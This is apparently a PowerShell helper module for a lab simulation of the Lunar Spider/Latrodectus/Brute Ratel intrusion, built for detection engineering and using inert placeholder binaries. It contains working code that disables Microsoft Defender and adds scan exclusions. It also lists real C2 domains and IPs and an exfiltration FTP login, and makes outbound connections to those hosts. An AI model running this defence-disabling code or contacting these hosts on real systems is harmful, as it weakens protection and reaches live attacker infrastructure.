# ============================================================================
# LUNAR SPIDER / LATRODECTUS / BRUTE RATEL / BACKCONNECT SIMULATION - UTILITIES
# ============================================================================
# Source: "From a Single Click: How Lunar Spider Enabled a Near-Two-Month
# Intrusion" - https://thedfirreport.com/2025/09/29/
#   from-a-single-click-how-lunar-spider-enabled-a-near-two-month-intrusion/
# Utility functions shared by all LunarSpiderSim phase scripts.
# ============================================================================

function Confirm-Execution {
    Write-Host "================================================================" -ForegroundColor Red
    Write-Host " WARNING: This script simulates a real malicious intrusion chain" -ForegroundColor Red
    Write-Host " (malvertising JS -> Brute Ratel C4 -> Latrodectus -> BackConnect" -ForegroundColor Red
    Write-Host " -> Cobalt Strike -> credential theft -> Rclone exfiltration)" -ForegroundColor Red
    Write-Host " based on a real DFIR Report investigation (Lunar Spider)." -ForegroundColor Red
    Write-Host " It creates local accounts, services, scheduled tasks, registry" -ForegroundColor Red
    Write-Host " keys, dropped files, and outbound connection attempts to REAL" -ForegroundColor Red
    Write-Host " threat-actor IOC infrastructure taken from the report." -ForegroundColor Red
    Write-Host " ONLY run this on an isolated, disposable/snapshot VM that has" -ForegroundColor Red
    Write-Host " no access to production data or networks." -ForegroundColor Red
    Write-Host "================================================================" -ForegroundColor Red

    $confirmation = Read-Host "Type 'EXECUTE-LUNARSPIDER-SIM' (exactly) to confirm you understand the risks"
    if ($confirmation -ne "EXECUTE-LUNARSPIDER-SIM") {
        Write-Host "Execution cancelled." -ForegroundColor Yellow
        exit
    }

    Write-Host "`nSimulation starting. Creating attack artifacts..." -ForegroundColor Cyan
}

function Start-SimulationLogging {
    $logPath = "$env:TEMP\LunarSpiderSim_execution.log"
    Start-Transcript -Path $logPath -Append | Out-Null
    Write-Host "Logging to $logPath"
    return $logPath
}

function Initialize-SimulationEnvironment {
    $simRoot = "$env:SystemDrive\LunarSpiderSim"
    $directories = @(
        "$simRoot\payloads",
        "$simRoot\tools",
        "$simRoot\logs",
        "$simRoot\exfil",
        "$simRoot\victim_files",
        "$simRoot\staging",
        "$simRoot\loot"
    )
    foreach ($dir in $directories) {
        New-Item -Path $dir -ItemType Directory -Force | Out-Null
    }

    if (-not [System.Diagnostics.EventLog]::SourceExists("LunarSpiderSim")) {
        try {
            [System.Diagnostics.EventLog]::CreateEventSource("LunarSpiderSim", "Application")
        } catch {
            Write-Warning "Unable to create event log source. Some events may not be logged."
        }
    }

    return @{
        Root        = $simRoot
        Payloads    = "$simRoot\payloads"
        Tools       = "$simRoot\tools"
        Logs        = "$simRoot\logs"
        Exfil       = "$simRoot\exfil"
        VictimFiles = "$simRoot\victim_files"
        Staging     = "$simRoot\staging"
        Loot        = "$simRoot\loot"
    }
}

function Disable-DefenderForSimulation {
    <#
        Disables Microsoft Defender real-time protection for the duration of the
        simulation so that the attack chain detonates deterministically and the
        intended artifacts are left behind for the analyst (real intrusions do the
        same - this is authentic defense-evasion behavior, MITRE T1562.001 Impair
        Defenses: Disable or Modify Tools).

        LAB-ONLY. This makes real, system-wide security changes. It is gated behind
        Confirm-Execution and assumes the isolated, disposable snapshot VM the rest
        of the simulation requires.

        On modern Windows, Tamper Protection blocks Set-MpPreference / registry
        edits; if so, the individual calls fail closed and we log that Defender is
        still active. To make this reliable, turn Tamper Protection OFF once in the
        VM image (Windows Security -> Virus & threat protection -> Manage settings)
        and snapshot - then this function fully disables Defender each run.
    #>
    param([switch]$AddExclusions)

    Write-Host "[*] Disabling Microsoft Defender for the simulation (lab-only, T1562.001) ..." -ForegroundColor Magenta

    # 1) Preferred path: Set-MpPreference (blocked if Tamper Protection is on)
    try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {}
    try { Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue } catch {}
    try { Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue } catch {}
    try { Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue } catch {}
    try { Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue } catch {}
    try { Set-MpPreference -MAPSReporting 0 -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue } catch {}

    # 2) Registry policy fallback (also Tamper-Protection-gated on modern builds)
    try {
        $rt = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
        New-Item -Path $rt -Force -ErrorAction SilentlyContinue | Out-Null
        Set-ItemProperty -Path $rt -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path $rt -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
        $dp = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
        New-Item -Path $dp -Force -ErrorAction SilentlyContinue | Out-Null
        Set-ItemProperty -Path $dp -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
    } catch {}

    # 3) Optionally exclude the sim root so any surviving scanner ignores it
    if ($AddExclusions) {
        try { Add-MpPreference -ExclusionPath "$env:SystemDrive\LunarSpiderSim" -ErrorAction SilentlyContinue } catch {}
        try { Add-MpPreference -ExclusionPath "$env:ALLUSERSPROFILE" -ErrorAction SilentlyContinue } catch {}
    }

    # Report resulting state so the run log shows whether it took effect
    try {
        $st = Get-MpComputerStatus -ErrorAction Stop
        Write-Host ("    RealTimeProtection now: {0}  (Tamper Protection: {1})" -f `
            $st.RealTimeProtectionEnabled, $st.IsTamperProtected) -ForegroundColor DarkGray
        if ($st.RealTimeProtectionEnabled) {
            Write-Host "    [!] Defender still active - Tamper Protection likely ON. Disable it once in the VM image and snapshot for a deterministic run." -ForegroundColor Yellow
        } else {
            Write-Host "    [OK] Defender real-time protection disabled." -ForegroundColor Yellow
        }
    } catch {
        Write-Host "    Defender status query unavailable (Defender may be absent on this VM)." -ForegroundColor DarkGray
    }
    Write-SimEvent -EventId 1000 -Message "SIMULATION: attempted to disable Microsoft Defender (T1562.001) at simulation start"
}

# Real threat-actor infrastructure from the DFIR Report - used for outbound
# connection attempts only, to generate authentic DNS/network telemetry.
# Connections will typically fail closed (sinkholed/offline) - that is expected
# and still yields real Sysmon/Zeek/firewall artifacts for detection engineering.
$Global:LunarIOCs = @{
    # First-stage JS -> MSI staging host
    MsiStageIP           = "91.194.11.64"

    # Latrodectus C2 (version 1.3, campaign 2221766521)
    LatrodectusDomains   = @(
        "workspacin.cloud", "illoskanawer.com", "grasmetral.com",
        "jarkaairbo.com", "scupolasta.store"
    )
    LatrodectusRC4Key    = "xkxp7pKhnkQxUokR2dl00qsRa6Hx0xvQ31jTD7EwUqj4RXWtHwELbZFbOoqCnXl8"

    # Brute Ratel C4 - upfilles.dll (Day 1) and wscadminui.dll (Day 5) config domains
    BruteRatelDomains    = @(
        "anikvan.com", "altynbe.com", "boriz400.com",
        "erbolsan.com", "samderat200.com", "dauled.com",
        "kasymdev.com", "kasym500.com"
    )

    # BackConnect (VNC-based) operator infrastructure
    BackConnectIPs       = @("193.168.143.196", "185.93.221.12")

    # Cobalt Strike beacons (cron801.dl_ / system.dl_ and sys.dll)
    CobaltStrikeC2       = @("45.129.199.214", "94.232.40.49", "94.232.249.186", "206.206.123.209")
    CobaltStrikeDomains  = @("techbulldigital.com", "filomeruginfor.com", "wehelpgood.xyz", "avtechupdate.com")
    CobaltStrikeUA       = "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"

    # Custom .NET backdoor (lsassa.exe) C2
    DotNetBackdoorDomain = "cloudmeri.com"
    DotNetBackdoorIP     = "162.0.209.121"

    # Metasploit staging (rejected in the real case)
    MetasploitC2         = "217.196.98.61"

    # Rclone FTP exfiltration endpoint
    ExfilFtpIP           = "45.135.232.3"
    ExfilFtpUser         = "J0eBidenAbrabdy1aS3ha2Yeami"

    # Operator VPS hostname leaked during RDP auth
    OperatorRdpHost      = "VPS2DAY-32220LE"
}

function Invoke-SafeNetworkAttempt {
    param(
        [Parameter(Mandatory)][string]$Target,
        [int]$Port = 443,
        [int]$TimeoutSec = 3
    )
    try {
        $null = Test-NetConnection -ComputerName $Target -Port $Port -InformationLevel Quiet `
            -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
    } catch {}
    try {
        Resolve-DnsName -Name $Target -ErrorAction SilentlyContinue -QuickTimeout | Out-Null
    } catch {}
}

function Write-SimEvent {
    param(
        [Parameter(Mandatory)][int]$EventId,
        [Parameter(Mandatory)][string]$Message,
        [string]$EntryType = "Warning"
    )
    try {
        Write-EventLog -LogName "Application" -Source "LunarSpiderSim" -EventId $EventId -Message $Message -EntryType $EntryType
    } catch {}
}

function Test-DomainJoined {
    return (Get-CimInstance -ClassName Win32_ComputerSystem).PartOfDomain
}

function New-DecoyBinary {
    <#
        Writes a random-byte placeholder binary. Used any time the report
        references a malware component we do not want to reconstruct/execute
        for real (Brute Ratel badger, Latrodectus DLL, Cobalt Strike beacon,
        zero.exe Zerologon PoC, the .NET backdoor, etc). The resulting file is
        inert but carries a realistic PE-ish size profile and a recognizable
        filename/path for artifact and IOC-matching purposes.
    #>
    param(
        [Parameter(Mandatory)][string]$Path,
        [int]$SizeBytes = 4096
    )
    $dir = Split-Path -Path $Path -Parent
    if ($dir -and -not (Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force | Out-Null }
    $bytes = New-Object byte[] $SizeBytes
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($bytes)
    # MZ header so PE-aware tools/YARA rules that gate on uint16(0)==0x5A4D still match
    $bytes[0] = 0x4D; $bytes[1] = 0x5A
    [System.IO.File]::WriteAllBytes($Path, $bytes)
    return $Path
}

function Invoke-BenignRundll32 {
    <#
        Reproduces the "rundll32 <payload>,<export>" process-tree and command-line
        artifact (Sysmon EID 1, Prefetch, Amcache) using the REAL, signed Windows
        rundll32.exe but pointed at an inert placeholder DLL that exports nothing.
        rundll32 exits immediately (no functional payload runs) yet the command
        line, parent/child relationship, and image-load telemetry are authentic.

        The placeholder DLLs are not real PE images, so rundll32 would normally pop
        a blocking "... is not a valid Win32 application" GUI dialog and wait for a
        human to click OK. We launch it through a WerFault/error-mode-suppressed
        child (SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX)
        so the process/command-line artifact is still created but NO modal dialog
        appears and the run stays fully unattended.
    #>
    param(
        [Parameter(Mandatory)][string]$DllPath,
        [Parameter(Mandatory)][string]$ExportName
    )
    try {
        # Suppress the "not a valid Win32 application" modal for children we spawn.
        # 0x8001 = SEM_FAILCRITICALERRORS(0x1) | SEM_NOOPENFILEERRORBOX(0x8000).
        # Setting it in THIS process is inherited by the rundll32 child.
        $sig = 'using System;using System.Runtime.InteropServices;public static class WinErrMode{[DllImport("kernel32.dll")]public static extern uint SetErrorMode(uint m);}'
        if (-not ("WinErrMode" -as [type])) { Add-Type -TypeDefinition $sig -ErrorAction SilentlyContinue | Out-Null }
        $prev = [WinErrMode]::SetErrorMode(0x8003)   # also SEM_NOGPFAULTERRORBOX(0x2)
        try {
            $p = Start-Process -FilePath "$env:SystemRoot\System32\rundll32.exe" `
                -ArgumentList "`"$DllPath`",$ExportName" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
            if ($p) {
                if (-not $p.WaitForExit(3000)) { Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue }
            }
        } finally {
            [WinErrMode]::SetErrorMode($prev) | Out-Null
        }
        # Belt-and-suspenders: dismiss any stray rundll32 error window that slipped through.
        Get-Process -Name "rundll32" -ErrorAction SilentlyContinue |
            Where-Object { $_.StartTime -gt (Get-Date).AddSeconds(-6) } |
            Stop-Process -Force -ErrorAction SilentlyContinue
    } catch {}
}
